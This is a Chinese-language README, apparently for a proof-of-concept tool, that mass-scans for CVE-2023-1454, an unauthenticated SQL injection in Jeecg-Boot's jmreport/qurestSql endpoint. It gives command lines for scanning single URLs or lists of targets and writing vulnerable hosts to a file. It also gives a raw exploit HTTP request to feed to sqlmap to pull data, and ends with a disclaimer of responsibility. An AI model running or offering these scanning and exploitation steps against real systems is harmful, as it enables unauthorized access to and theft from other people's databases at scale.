# CVE-2023-1454
jmreport/qurestSql 未授权SQL注入批量扫描poc
Jeecg-Boot是一款基于Spring Boot和Jeecg-Boot-Plus的快速开发平台，最新的jeecg-boot 3.5.0 中被爆出多个SQL注入漏洞。

## 工具利用

python3 CVE-2023-1454-scan.py -u http://127.0.0.1:1111 单个url测试

python3 CVE-2023-1454-scan.py -f url.txt 批量检测

扫描结束后会在当前目录生成存在漏洞url的vuln.txt

poc：

![](./poc.png)

exp：

将数据包保存为txt用sqlmap可得到数据
```
POST /jeecg-boot/jmreport/qurestSql HTTP/1.1
Host: xxx.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2088.112 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/json;charset=UTF-8
Content-Length: 129

{"apiSelectId":"1290104038414721025",
"id":"1"}
```
![](./exp.png)
## 免责声明

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。
